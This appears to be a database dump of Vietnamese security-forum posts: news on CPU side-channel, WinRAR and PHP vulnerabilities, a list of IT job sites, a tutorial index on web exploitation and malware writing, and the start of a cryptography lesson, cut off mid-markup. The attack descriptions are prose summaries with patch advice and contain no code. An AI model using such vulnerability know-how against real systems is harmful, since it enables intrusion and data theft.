(57, 'Phát hiện bộ ba lỗ hổng ảnh hưởng đến các CPU đời mới', '', '<div class=\"bbWrapper\"><b>Bộ ba lỗ hổng dẫn đến các cuộc tấn công kênh bên (Side-channel attack) vừa được phát hiện dẫn đến rò rỉ dữ liệu nhạy cảm từ các bộ xử lý CPU hiện đại.</b><br>\r\n    <br>\r\n    Đây là kiểu tấn công cho phép tin tặc trích xuất thông tin từ thiết bị mà không cần động đến phần bảo mật của hệ thống.<br>\r\n    <br>\r\n    Ba lỗ hổng lần lượt là <b>Downfall</b> (CVE-2022-40982), <b>Inception</b> (CVE-2023-20569) và <b>Collide+Power</b> (CVE-2023-20583), xuất hiện sau khi công bố lỗ hổng Zenbleed (CVE-2023-20593) ảnh hưởng đến các CPU kiến trúc Zen 2 của AMD.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n         <img src=\"Imageass/1691659725568.png\">\r\n    </div><h3><b>Lỗ hổng Downfall (CVE-2022-40982)</b>​</h3>Cuộc tấn công kiểu này nhắm vào một điểm yếu trong hàng tỷ bộ vi xử lý tiên tiến được dùng cho máy tính cá nhân và đám mây. Điểm yếu này cho phép người dùng truy cập và đánh cắp dữ liệu từ người dùng khác trên cùng một máy tính.<br>\r\n    <br>\r\n    Lỗ hổng bắt nguồn từ các tính năng tối ưu hóa bộ nhớ được Intel giới thiệu trong các bộ xử lý, đặc biệt là những bộ xử lý có tập lệnh AVX2 và AVX-512, từ đó cho phép phần mềm không đáng tin cậy vượt qua được các biện pháp cách ly và truy cập vào vùng dữ liệu của các chương trình khác.<br>\r\n    <br>\r\n    Tuy nhiên, để khai thác được lỗ hổng cần phải kết hợp hai kiểu tấn công thực thi tạm là Gather Data Sampling (GDS) và Gather Value Injection (GVI).<br>\r\n    <br>\r\n    Lỗ hổng được đánh giá có mức độ nghiêm trọng trung bình. Intel đã phát hành một bản cập nhật vi mã để giảm thiểu rủi ro, mặc dù có khả năng giảm hiệu năng của các CPU lên đến 50%. Danh sách đầy đủ các sản phẩm bị ảnh hưởng xem <a href=\"https://www.intel.com/content/www/us/en/developer/topic-technology/software-security-guidance/processors-affected-consolidated-product-cpu-model.html\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.intel.com%2Fcontent%2Fwww%2Fus%2Fen%2Fdeveloper%2Ftopic-technology%2Fsoftware-security-guidance%2Fprocessors-affected-consolidated-product-cpu-model.html&amp;hash=0a6e9d5082b8fd9852587b0471b091d3\" rel=\"noopener\">tại đây</a>.<br>\r\n    <h3><b>Lỗ hổng Inception (CVE-2023-20569)</b>​</h3>Tương tự Downfall, Inception cho phép tấn công thực thi tạm nhằm làm rò rỉ bộ nhớ trong nhân tùy ý trên tất cả các CPU của AMD Zen, bao gồm cả bộ xử lý Zen 4 mới nhất, với tốc độ 39 byte/giây.<br>\r\n    <br>\r\n    Từ đó, tin tặc có thể chiếm đoạt luồng điều khiển tạm thời của các lệnh trả về trên tất cả các bộ xử lý AMD Zen.<br>\r\n    <br>\r\n    Kỹ thuật khai thác này là sự kết hợp của lỗ hổng Phantom speculation (CVE-2022-23825) và phương pháp Training in Transient Execution (TTE), làm rò rỉ thông tin tương tự như lỗ hổng Spectre-V2 và Retbleed.<br>\r\n    <br>\r\n    Ngoài việc cung cấp các bản cập nhật vi mã và các giải pháp giảm thiểu khác, AMD còn cho biết lỗ hổng này <i>“chỉ có thể khai thác cục bộ, chẳng hạn qua tấn công phishing để tải xuống mã độc và khuyến cáo khách hàng áp dụng các giải pháp an ninh tốt nhất, bao gồm việc cập nhật phần mềm và các công cụ phát hiện mã độc.”</i><br>\r\n    <h3><b>Lỗ hổng Collide+Power (CVE-2023-20583)</b>​</h3>Cuối cùng là lỗ hổng Collide+Power làm rò rỉ dữ liệu tùy ý qua các chương trình khác nhau cũng như bất kỳ vùng an ninh nào với tốc độ lên đến 188.80 bit/giờ.<br>\r\n    <br>\r\n    Lỗ hổng xảy ra từ các thành phần trong CPU được chia sẻ, như các hệ thống bộ nhớ trong, kết hợp với dữ liệu của tin tặc và dữ liệu từ các ứng dụng khác dẫn đến việc rò rỉ công suất tiêu thụ điện năng.<br>\r\n    <br>\r\n    Nguy cơ xảy ra tấn công Collide+Power tương đối thấp với công nghệ hiện tại và khả năng trở thành mục tiêu của một cuộc tấn công bằng lỗ hổng Collide+Power với tư cách là người dùng cuối là không cao.<br>\r\n    <br>\r\n    Vì Collide+Power là một kỹ thuật độc lập liên quan đến vấn đề điện năng nên các biện pháp giảm thiểu khả thi phải được triển khai ở cấp độ phần cứng để ngăn chặn các xung đột dữ liệu bị khai thác, hoặc nếu ở cấp độ phần mềm hay phần cứng sẽ ngăn kẻ tấn công giám sát được tín hiệu cần thiết.<br>\r\n    <br>\r\n    <div style=\"text-align: right\"><b><i>Theo </i></b><a href=\"https://thehackernews.com/2023/08/collidepower-downfall-and-inception-new.html\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fthehackernews.com%2F2023%2F08%2Fcollidepower-downfall-and-inception-new.html&amp;hash=7e4be7c69adc4281d10a8ab4e21c3a7c\" rel=\"noopener\"><b><i>The Hacker News</i></b></a>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(58, 'Phát hiện thêm một zero-day mới trong WinRAR', '', '<div class=\"bbWrapper\"><b>Lỗ hổng zero-day CVE-2023-38831 tồn tại trong WinRAR hiện đang bị tin tặc khai thác từ tháng 04/2023 để cài đặt mã độc.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        \r\n    <img src=\"Imageass/Capture.JPG\">\r\n    </div><br>\r\n    Đầu tiên, kẻ tấn công có thể tạo các tệp nén .RAR và .ZIP độc hại từ các tệp tin vô hại, chẳng hạn như ảnh dạng JPG (.jpg), tệp văn bản (.txt) hoặc tài liệu PDF (.pdf) để đánh lừa nạn nhân tải xuống.<br>\r\n    <br>\r\n    Tiếp đó, khi nạn nhân mở tệp nén này lỗ hổng sẽ tạo ra một đoạn mã thực thi nhằm tải mã độc về để kiểm soát thiết bị.<br>\r\n    <br>\r\n    Cụ thể, khi các nhà nghiên cứu thực nghiệm tải và mở một file nén PDF độc hại trên máy, lỗ hổng được kích hoạt bằng cách tạo các tệp nén đặc biệt với cấu trúc bị sửa đổi, khiến chức năng ShellExecute của WinRAR nhận được tham số không chính xác khi cố mở tệp giả mạo. Điều này dẫn đến việc WinRAR bỏ qua tệp vô hại, thay vào đó định vị và thực thi một tập lệnh batch hoặc CMD.<br>\r\n    <br>\r\n    Người dùng nghĩ rằng mình đang mở một tệp an toàn nhưng thực tế chương trình lại khởi chạy một tệp chứa mã độc. Những mã độc đã được phát tán trong các chiến dịch tấn công bao gồm DarkMe, GuLoader và Remcos RAT…<br>\r\n    <br>\r\n    <div style=\"text-align: center\"><a href=\"https://whitehat.vn/attachments/1692930722737-png.15190/\" target=\"_blank\" class=\"js-lbImage\" data-lb-sidebar-href=\"\" data-lb-caption-extra-html=\"\" data-fancybox=\"lb-thread-17426\" data-caption=\"<h4>1692930722737.png</h4><p><a href=&quot;https:&amp;#x2F;&amp;#x2F;whitehat.vn&amp;#x2F;threads&amp;#x2F;phat-hien-them-mot-zero-day-moi-trong-winrar.17426&amp;#x2F;#post-42833&quot; class=&quot;js-lightboxCloser&quot;>WhiteHat Team · 24&amp;#x2F;08&amp;#x2F;2023 lúc 7:15 PM</a></p>\" style=\"cursor: pointer;\">\r\n        <img src=\"Imageass/15503-aea09904fe13287c8ac86535682a1a31.jpg\"></a>​</div><br>\r\n    Lỗ hổng được cho là đang bị lợi dụng để nhắm vào các diễn đàn giao dịch chứng khoán và tiền điện tử.<br>\r\n    <br>\r\n    Các tệp nén độc hại đã được đăng tải trên ít nhất tám diễn đàn giao dịch công cộng, lây nhiễm sang 130 thiết bị. Hiện chưa rõ số lượng nạn nhân và tổn thất tài chính do chiến dịch này gây ra.<br>\r\n    <br>\r\n    Đây là lỗ hổng thứ 2 của WinRAR được công bố trong vòng 1 tuần. Trước đó là <a href=\"https://whitehat.vn/threads/canh-bao-lo-hong-thuc-thi-ma-tu-xa-trong-winrar-anh-huong-hang-tram-trieu-nguoi-dung.17409/\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2Fcanh-bao-lo-hong-thuc-thi-ma-tu-xa-trong-winrar-anh-huong-hang-tram-trieu-nguoi-dung.17409%2F&amp;hash=ddfb84171c82a33ced09e366a909b876\">CVE-2023-40477</a> cho phép tin tặc thực thi mã từ xa trên thiết bị mục tiêu.<br>\r\n    <br>\r\n    Phiên bản WinRAR 6.23 được phát hành đều xử lý được cả hai lỗ hổng nói trên. Người dùng được khuyến cáo nâng cấp lên phiên bản WinRAR mới nhất càng sớm càng tốt để loại bỏ nguy cơ trở thành nạn nhân của các chiến dịch tấn công đang diễn ra.<br>\r\n    <br>\r\n    <div style=\"text-align: right\"><b>Nguồn: </b><a href=\"https://www.bleepingcomputer.com/news/security/WinRAR-zero-day-exploited-since-april-to-hack-trading-accounts/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.bleepingcomputer.com%2Fnews%2Fsecurity%2FWinRAR-zero-day-exploited-since-april-to-hack-trading-accounts%2F&amp;hash=8f09ba15bf0fb042e3af71591b1443a6\" rel=\"noopener\"><i><b>Bleeping Computer</b></i></a>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(59, 'Lỗ hổng nghiêm trọng trong ngôn ngữ lập trình phổ biến PHP', '', '<div class=\"bbWrapper\"><span style=\"font-size: 15px\"><b>Hai lỗ hổng nghiêm trọng vừa được phát hiện trong PHP - một ngôn ngữ lập trình phổ biến dùng để phát triển các ứng dụng viết cho máy chủ, mã nguồn mở, thích hợp để tạo các trang web động và có thể dễ dàng kết hợp với HTML.</b></span><br>\r\n    <br>\r\n    <div style=\"text-align: center\"><span style=\"font-size: 15px\"><b>\r\n        <img src=\"Imageass/php.png\">\r\n    </b></span>​</div><h3><b>CVE-2023-3823: Lỗi tiết lộ thông tin</b>​</h3>Đây là lỗ hổng tiết lộ thông tin có điểm CVSS 8,6 cho phép kẻ tấn công từ xa đánh cắp thông tin nhạy cảm từ ứng dụng viết bằng PHP.<br>\r\n    <br>\r\n    Lỗ hổng tồn tại do xác thực đầu vào XML của người dùng cung cấp không đầy đủ. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách gửi mã XML tự tạo tới ứng dụng. Sau đó, ứng dụng sẽ phân tích cú pháp của mã này, từ đó kẻ tấn công có quyền truy cập vào thông tin nhạy cảm, chẳng hạn như nội dung của các tệp tùy ý trên hệ thống hoặc xem được kết quả các truy vấn bên ngoài.<br>\r\n    <br>\r\n    Mọi ứng dụng, thư viện và máy chủ phân tích cú pháp hoặc tương tác với các tài liệu XML đều bị ảnh hưởng bởi CVE-2023-3823.<br>\r\n    <h3><b>CVE-2023-3824: Lỗi tràn bộ đệm</b>​</h3>Đây là lỗ hổng tràn bộ đệm có điểm CVSS 9,4 cho phép kẻ tấn công từ xa thực thi mã tùy ý trên hệ thống chạy bằng PHP.<br>\r\n    <br>\r\n    Lỗ hổng tồn tại do kiểm tra giới hạn hàm phar_dir_read() không đúng. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách gửi một yêu cầu tự tạo tới ứng dụng gây ra lỗi tràn bộ đệm, cho phép chúng giành quyền kiểm soát hệ thống và thực thi mã tùy ý.<br>\r\n    <br>\r\n    Bên cạnh đó, vẫn còn rủi ro về việc tràn bộ đệm trong hàm \"memset\". Mặc dù hiện tại chưa có trường hợp nào xảy ra trong chính PHP, nhưng các tiện ích mở rộng từ bên thứ ba vẫn có thể bị ảnh hưởng bởi CVE-2023-3824.<br>\r\n    <br>\r\n    Thực tế, việc tấn công và lạm dụng lỗ hổng này khá phức tạp, tùy thuộc vào ứng dụng bị nhắm mục tiêu. Tuy vậy, về mặt lý thuyết, việc khai thác vẫn có thể xảy ra. Theo khuyến cáo cho biết: <i>\"Những người kiểm tra nội dung của các tệp phar không đáng tin cậy có thể bị ảnh hưởng.\"</i><br>\r\n    <h3><b>Khuyến cáo</b>​</h3>Cả hai lỗ hổng CVE-2023-3823 và CVE-2023-3824 đều đã được vá trong <a href=\"https://www.php.net/downloads#v8.0.30\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.php.net%2Fdownloads%23v8.0.30&amp;hash=12f6e13e70e7bbdea20a5a45ef13cdc8\" rel=\"noopener\">phiên bản PHP 8.0.30</a> và đã có mã khai thác (PoC). Vì vậy, người dùng nên nâng cấp lên phiên bản mới càng sớm càng tốt và thực hiện thêm các bước dưới đây để bảo vệ các ứng dụng viết bằng PHP:<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">Xác thực tất cả dữ liệu đầu vào của người dùng đầy đủ</li>\r\n    <li data-xf-list-type=\"ul\">Sử dụng tường lửa ứng dụng web (WAF) để ngăn chặn các lỗ hổng và hành vi độc hại.</li>\r\n    <li data-xf-list-type=\"ul\">Luôn cập nhật phiên bản mới nhất của PHP.</li>\r\n    </ul><div style=\"text-align: right\"><b><i>Theo </i></b><a href=\"https://securityonline.info/cve-2023-3823-cve-2023-3824-php-security-vulnerabilities/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fsecurityonline.info%2Fcve-2023-3823-cve-2023-3824-php-security-vulnerabilities%2F&amp;hash=44aa2de03a5dc3bb084e8116c02411b7\" rel=\"noopener\"><b><i>Security Online</i></b></a>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(60, 'Website', '', '1.TopDev<br>\r\ntopdev được xem là một trong các trang web tìm việc làm cho sinh viên IT uy tín nhất hiện nay.với hệ thống database lớn,các ứng cử viên có thể dễ dàng sàng lọc việc làm phù hợp theo tiêu chí bản thân. Đồng thời trang web này luôn cập nhật công việc mới mỗi ngày, tạo thêm nhiều sự lựa chọn cho ứng viên.<br><br>\r\n2.ITVIEC<br>\r\nnằm trong danh sách các trang web tuyển dụng IT lớn nhất hiện nay ITVIEC được ví như thiên đường tìm việc làm dành cho dân developer<br>\r\ncác tin tuyển dụng trên chuyên trang này\r\nhầu hết đều là từ các công ty công nghệ nổi tiếng với mức lương hấp dẫn. Tuy nhiên, phần lớn các công ty này sẽ đòi hỏi bạn cần có kinh nghiệm dày dặn. nhưng nếu bạn cảm thấy tự tin về kiến thức và kỹ năng của mình, các bạn vẫn có thể thử sức ứng tuyển.<br><br>\r\n3.DEVWORK<br>\r\nnếu nói đến những web tuyển dụng IT hàng đầu thì không thể không kể đến DEVWORK.vừa mới gia nhập vào thị trường việt nam gần đây,DEVWORK đang dần khẳng định vị trí của mình trên thị trường IT.<br>\r\nđây là một nền tảng nhằm liên kết ứng viên tiềm năng và các nhà tuyển dụng. điểm khác biệt lớn nhất của DEVWORK và các trang web tìm việc khác là tại đây có các bài test dành cho developer. Qua những bài test này, các nhà tuyển dụng sẽ sàng lọc ứng viên ,tối ưu hóa hiệu quả tuyển dụng.<br><br>\r\n4.NHANLUCIT<br>\r\nNHANLUCIT cũng là một trong các website tìm việc làm cho sinh viên IT.tuy trang web này vẫn còn đang trong giai đoạn phát triển nhưng lại được cộng đồng IT tín nhiệm.Lý do là vì phần lớn các tin tuyển dụng trên NHANLUCIT đều đáng tin cậy.Ngoài ra, NHANLUCIT còn có cả một đội ngũ nhân viên hỗ trợ nhiệt tình, kiến thức sâu rộng về thị trường IT hiện nay.<br><br>\r\n5.CAREERBUILDER<br>\r\nthuộc sở hữu của mỹ, CAREERBUILDER là trang web tuyển dụng đa quốc gia với quy mô lớn. Chuyên trang này đặc biệt phù hợp với những bạn sinh viên IT có kinh nghiệm hoặc có thành tích nổi bật.Nhưng bù lại, mức lương và đãi ngộ của các công việc trên trang web này rất cao. hơn nữa, có rất nhiều công ty nước ngoài cũng đăng tuyển trên trang web này.Nếu bạn đang muốn tìm một cơ hội để ra nước ngoài làm việc thì CAREERBUILDER là môi trường lý tưởng nhất dành cho bạn đấy<br><br>\r\n6.VIETNAMWORKS<br>\r\ntrong số các trang web tìm việc làm cho sinh viên IT thì Vietnamworks nhận được sự quan tâm và hưởng ứng lớn từ phía ứng cử viên lẫn nhà tuyển dụng.Điểm nổi bật của chuyên trang này là thông tin tuyển dụng uy tín, đa dạng và đãi ngộ cao.<br>\r\nngoài ra, vietnamworks hiện đang đồng hành cùng với đại học FPT, nhằm tạo điều kiện cho sinh viên nghành IT tham gia các chương trình thực tập để nâng cao kĩ năng mềm chuyên môn<br><br>\r\n7.CAREERLINK<br>\r\ntuy careerlink không phải là một trang web tuyển dụng chuyên về IT, nhưng bù lại thông tin tuyển dụng trên trang web này rất uy tín. phần lớn các công ty đa quốc gia hoặc quy mô lớn đều lựa chọn careerlink để đăng tin tuyển dụng.Bên cạnh đó, trang web này còn phân chia việc làm theo lĩnh vực và vùng miền.Vì vậy mà các bạn sinh viên IT vẫn có thể dễ dàng tìm được cho mình những công việc phù hợp với nhu cầu.<br><br>\r\n8.GLINTS<br>\r\nthêm một trang web tuyển dụng chất lượng dành cho các bạn sinh viên IT. ưu điểm của Glints chính là chức năng TalenHunt khá đặc biệt.Sau khi hoàn thành profile ứng tuyển của mình, chức năng này sẽ tự động \"match\" kỹ năng của bạn với nhu cầu của nhà tuyển dụng.Sau đó, Glints sẽ hỗ trợ bạn deal lương, tìm hiểu thông tin về công việc.Nhờ vậy mà bạn tiết kiệm được nhiều thời gian hơn, đỡ tốn công đi tìm việc hay nộp đơn.Hơn nữa,các bạn còn có thể ứng tuyển làm việc ở các quốc gia đông nam á hoặc làm việc từ xa cho các công ty nước ngoài nữa đấy<br><br>\r\n9.YBOX<br>\r\nnếu bạn đang có nhu cầu tìm những dự án IT để thực hành nâng cao tay nghề thì Ybox là lựa chọn lý tưởng nhất.khác với các trang web ở trên, Ybox vốn được thành lập với mục đích gắn kết sinh viên với nhà tuyển dụng bằng cách tổng hợp nhiều thông tin tuyển dụng từ nhiều web khác nhau.điểm cộng khi tìm việc làm trên Ybox là bạn có thể chọn lọc thông tin tuyển dụng dựa theo kinh nghiệm, địa điểm, nghành nghề,...Ngoài ra, Ybox còn thường xuyên có các sự kiện học bổng, event đáng tham dự dành cho các bạn sinh viên IT nữa đấy.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(61, 'Kiến thức cơ bản về an ninh mạng', '', 'Để tìm hiểu về lĩnh vực an ninh mạng, trước tiên bạn cần trang bị cho mình những kiến thức cơ bản của công nghệ thông tin như: lập trình, mạng máy tính, cơ sở dữ liệu, kiến trúc máy tính… Chúng tôi coi các kiến thức này bạn đã có khi tham gia vào WhiteHat.<br>\r\nLĩnh vực an ninh mạng có thể nói là rất rộng lớn, tuy nhiên bạn có thể bắt đầu với những nội dung cơ bản của:<br>\r\nKỹ thuật dịch ngược<br>\r\nLỗ hổng phần mềm<br>\r\nKỹ thuật mã hóa<br>\r\nLỗ hổng web<br>\r\nKỹ thuật điều tra thông tin<br>\r\nMalware<br>\r\n........<br>\r\nBạn nên thường xuyên tham gia các cuộc thi kiến thức trên WhiteHat Contest, WhiteHat Grand Prix trên hệ thống WarGame để có thêm kỹ năng thực tế và vận dụng những lý thuyết đã học một cách trực quan hơn.<br>\r\nKIẾN THỨC CƠ BẢN VỀ AN NINH MẠNG:​<br>\r\n1. Forensic<br>\r\nForensic1: Tổng quan về Computer Forensics<br>\r\nForensic2: Network Forensics - Phần 1<br>\r\nForensic3: Network Forensics - Phần 2<br>\r\nForensic4: Log Mining<br>\r\nForensic5: Memory Forensics<br>\r\nForensic6: Steganography<br>\r\nForensic7: Mobile Data - WhatsApp<br>\r\nForensic8: Emotet - Catch me if you can (Part 1)<br>\r\nForensic9: Emotet - Catch me if you can (Part 2)<br>\r\nForensic10: Thực hành điều tra server bị tấn công<br><br>\r\n\r\n\r\n2. Crypto<br>\r\nCrypto1: Hệ thống mật mã - Phần 1<br>\r\nCrypto2: Hệ thống mật mã - Phần 2<br>\r\nCrypto3: Hệ thống mật mã - Phần 3<br>\r\nTổng quan về Cryptography<br>\r\nGiới thiệu về mật mã cổ điển - Phần 1<br>\r\nGiới thiệu về mật mã cổ điển - Phần 2<br>\r\nGiới thiệu về mật mã cổ điển - Phần 3<br>\r\nGiới thiệu về mật mã cổ điển - Phần 3 - Mã thay thế<br>\r\nKiến trúc mã hoá khối (Block Cipher) – Phần 1<br>\r\nKiến trúc mã hoá khối (Block Cipher) – Phần 2<br><br>\r\n\r\n\r\n3. Web<br>\r\nWeb1: SQL injection - Con đường khai thác phổ biến: qua “user input”.<br>\r\nWeb2: SQL injection - Các con đường khai thác khác<br>\r\nWeb3: SQL injection - Các hướng khai thác<br>\r\nWeb4: SQL injection - Các bước khai thác<br>\r\nWeb5: SQL injection - Một số kỹ thuật vượt qua cơ chế lọc<br>\r\nWeb6: SQL injection - Một số tool khai thác<br>\r\nWeb7: SQL injection - Các cách phòng chống & kết luận<br>\r\nWeb8: Các kiểu khai thác XSS - Phần 1: Reflected XSS<br>\r\nWeb9: Các kiểu khai thác XSS - Phần 2: Stored XSS<br>\r\nWeb10: Các kiểu khai thác XSS - Phần 3: Dom Based XSS<br>\r\nWeb11: Một số hình thức giả mạo http headers<br>\r\nWeb12: HTTP Cookie và một số vấn đề bảo mật - Phần 1<br>\r\nWeb12: HTTP Cookie và một số vấn đề bảo mật - Phần 2<br>\r\nWeb13: Session Fixation<br>\r\nWeb14: Session Hijacking<br>\r\nWeb15: Các vấn đề an ninh trong giao thức HTTP - Phần 1<br>\r\nWeb16: Các vấn đề an ninh trong giao thức HTTP - Phần 2<br>\r\nWeb17: Giới thiệu khai thác lỗ hổng Cross Site Port Attacks - Phần 1<br>\r\nWeb18: Giới thiệu khai thác lỗ hổng Cross Site Port Attacks - Phần 2<br>\r\nWeb19: Web phishing - Từ tạo website tấn công đến tự bảo vệ - Phần 1<br>\r\nWeb20: Web phishsing - Từ tạo website tấn công đến tự bảo vệ - Phần 2<br>\r\nWeb21: CSRF – Khái niệm, kịch bản khai thác và cách phòng chống - Phần 1<br>\r\nWeb22: CSRF – Khái niệm, kịch bản khai thác và cách phòng chống - Phần 2<br><br>\r\n\r\n4. Reverse Engineering<br>\r\nRe1: Giới thiệu về Reverse-Engineering<br>\r\nRe2: Hướng dẫn sử dụng OllyDBG<br>\r\nRe3: Hướng dẫn sử dụng IDA<br>\r\nRe4: Hướng dẫn sử dụng .NET Reflector<br>\r\nRe5: Pack & UnPack<br>\r\nRe6: AntiDebug<br><br>\r\n\r\n\r\n\r\n5. Exploitation<br>\r\nExp1: Giới thiệu cơ bản về exploitation<br>\r\nExp2: Video hướng dẫn sử dụng gdb<br>\r\nExp3: Khai thác lỗi tràn bộ đệm trên Linux<br>\r\nExp4: Video giới thiệu khai thác lỗ hổng tràn bộ đệm trên Linux<br>\r\nExp5: NX và ASLR trên Linux<br>\r\nExp6: Lỗ hổng format string<br>\r\nExp7: Khai thác format string - Phần 1<br>\r\nExp8: Khai thác format string - Phần 2<br>\r\nExp9: Lỗi tràn bộ đệm trên Windows<br>\r\nExp10: Giới thiệu về thiết bị nhúng<br>\r\nExp11: Thiết bị nhúng - Phần 1<br>\r\nExp12: Thiết bị nhúng - Phần 2<br>\r\nExp13: Thiết bị nhúng - Phần 3<br>\r\nExp14: Thiết bị nhúng - Phần 4<br><br>\r\n\r\n\r\n\r\n6. Malware<br>\r\nMalware1: Beginner đến với thế giới virus<br>\r\nMalware2: Khái niệm về các loại mã độc<br>\r\nMalware3: Phân tích mã độc - Bài 1: Quy trình phân tích mã độc và các tool sử dụng<br>\r\nMalware4: Phân tích mã độc - Bài 2: Phân tích Macro<br>\r\nMalware5: Phân tích mã độc - Bài 3: Phân tích mã độc Javascript Facebook<br>\r\nMalware6: Phân tích mã độc - Bài 4: Hướng dẫn Reverse chương trình viết bằng dotNET<br>\r\nMalware7: Phân tích mã độc - Bài 5: Hướng dẫn phân tích file viết bằng Visual Basic<br>\r\nMalware8: Phân tích mã độc - Bài 6: Phân tích Spyware nghe lén và chụp ảnh thông qua webcam<br>\r\nMalware9: Ransomware Petya<br>\r\nMalware10: Ransomware Locky<br>\r\nMalware11: Phân tích kỹ thuật lây file sử dụng Relocation và mẫu virus lây file W32.FamVT.RelocationResur.PE<br>\r\nMalware12: Cơ chế lây file của virus sử dụng kỹ thuật delta<br>\r\nMalware13: Mã độc trên mobile - Bài 1: Android có thực sự mang lại sự an toàn cho người dùng?<br>\r\nMalware14: Mã độc trên mobile - Bài 2: Hướng dẫn phân tích mã độc trên nền tảng Android<br>\r\nMalware15: Hướng dẫn lập trình một số hành vi điển hình của mã độc - Bài 1: Ghi đề MBR<br>\r\nMalware16: Hướng dẫn lập trình một số hành vi điển hình của mã độc - Bài 2: Disable taskmanager, registry -C, C++ cho Virus - Phần 3 - Disable TaskManager<br>\r\nMalware17: Hướng dẫn lập trình một số hành vi điển hình của mã độc - Bài 3: Disable taskmanager, registry -C, C++ cho Virus - Phần 4 - Enable Taskmanager, Disable_Enable Registry, Disable_Enable Msconfig<br>\r\nMalware18: Hướng dẫn lập trình một số hành vi điển hình của mã độc - Bài 4: Disable taskmanager, registry - Lập trình keylogger<br>\r\nMalware19: Giới thiệu ollydebug<br>\r\nMalware20: Giới thiệu IDA<br>\r\nMalware21: Giới thiệu công cụ CFF đọc thông tin PE file<br>\r\nMalware22: Giới thiệu công cụ WinDbg phân tích rootkit<br>\r\nMalware23: Giới thiệu công cụ phân tích virus C#<br><br>\r\n\r\nQua những bài viết trong phần kiến thức cơ bản về an ninh mạng các bạn sẽ nắm được những kiến thức nhất định trong lĩnh vực mình nghiên cứu. Bên cạnh đó, việc tích cực tham gia hỏi đáp, trao đổi thông tin trên diễn đàn cũng là cách rất tốt để trau dồi, hoàn thiện kiến thức. Điều cuối cùng đó là bạn hãy luôn luôn giữ trong mình niềm đam mê. Đó chính là phương pháp tốt nhất giúp bạn tiến xa hơn trong lĩnh vực này.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(62, 'Giới thiệu về mật mã cổ điển - Phần 1', '', '<div class=\"bbWrapper\"><b>1.Lịch sử phát triển của mật mã</b><br><br>\r\n    <div style=\"margin-left: 20px\">Trong lịch sử phát triển của nhân loại,\r\n        từ khi con người xuất hiện nhu cầu trao đổi thông tin với nhau thì\r\n        nhu cầu giữ bí mật và đảm bảo tính an toàn của những thông tin đó \r\n        cũng xuất hiện theo. Đó có thể là những thông tin quân sự quan trọng\r\n        không thể để lộ ra cho kẻ thù, những âm mưu được ấp ủ, chỉ được \r\n        thông báo cho những người liên quan, những ghi chép về kho báu\r\n        hay thậm chí là thư từ cá nhân.\r\n    ​</div>\r\n    <div style=\"margin-left: 20px\">​</div>\r\n    <div style=\"margin-left: 20px\">Sự cần thiết của việc tìm ra một phương pháp đơn giản,\r\n         hiệu quả để đảm bảo an toàn cho một thông điệp cần gửi đi chính là nguyên nhân\r\n          của sự hình thành mật mã.​\r\n    </div>\r\n    <div style=\"margin-left: 20px\">​</div>\r\n    <div style=\"margin-left: 20px\">Và cuộc chiến giữa một bên luôn muốn che giấu thông tin\r\n         của mình còn một bên luôn muốn đọc được những thông tin đó đã thúc đẩy mật\r\n          mã ngày càng phát triển.\r\n    ​</div>\r\n    <div style=\"margin-left: 20px\">​</div>\r\n    <div style=\"text-align: center\">\r\n        <div style=\"margin-left: 20px\">\r\n            <img src=\"Imageass/mat-ma-co-dien_1.png\">\r\n        </div>\r\n    </div>\r\n    <div style=\"margin-left: 20px\">​</div><b>2.Các khái niệm cơ bản</b><br>\r\n    <div style=\"margin-left: 20px\">-<b>Ngành Mật mã</b> (cryptology) thường được quan niệm như sự kết hợp của 2 lĩnh vực con:​</div><ul>\r\n    <li data-xf-list-type=\"ul\"><br>\r\n    [*=1]·        Sinh, chế mã mật (cryptography): nghiên cứu các kỹ thuật toán học nhằm cung cấp các công cụ hay dịch vụ đảm bảo an toàn thông tin</li>\r\n    <li data-xf-list-type=\"ul\"><br>\r\n    [*=1]·        Phá giải mã (cryptanalysis): nghiên cứu các kỹ thuật toán học phục vụ phân tích phá mật mã và/hoặc tạo ra các đoạn mã giản nhằm đánh lừa bên nhận tin.</li>\r\n    </ul><div style=\"margin-left: 40px\">Hai lĩnh vực con này tồn tại như hai mặt đối lập, “đấu tranh để cùng phát triển” của một thể thống nhất là ngành khoa học mật mã (cryptology). Tuy nhiên, do lĩnh vực thứ hai (cryptanalysis) ít được phổ biến quảng đại nên dần dần, cách hiểu chung hiện nay là đánh đồng hai thuật ngữ cryptography và cryptology. Theo thói quen chung này, hai thuật ngữ này có thể dùng thay thế nhau. Thậm chí cryptography là thuật ngữ ưa dùng, phổ biến trong mọi sách vở phổ biến khoa học, còn cryptology thì xuất hiện trong một phạm vi hẹp của các nhà nghiên cứu học thuật thuần túy.​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 20px\">-         <b>Plaintext</b>: Văn bản ban đầu khi chưa được mã hóa, thường được gọi là bản rõ.​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 20px\">-         <b>Ciphertext</b>: Văn bản sau khi đã được mã hóa, thường được gọi là bản mã.​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 20px\">-         <b>Encrypt</b>: Hành động biến đổi bản rõ thành bản mã, sử dụng một thuật toán mã hóa nào đó.​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 20px\">-         <b>Decrypt </b>: Hành động biển đổi bản mã thành bản rõ, sử dụng thuật toán giải mã tương ứng với thuật toán mã hóa đã được sử dụng để tạo ra bản mã.​</div><div 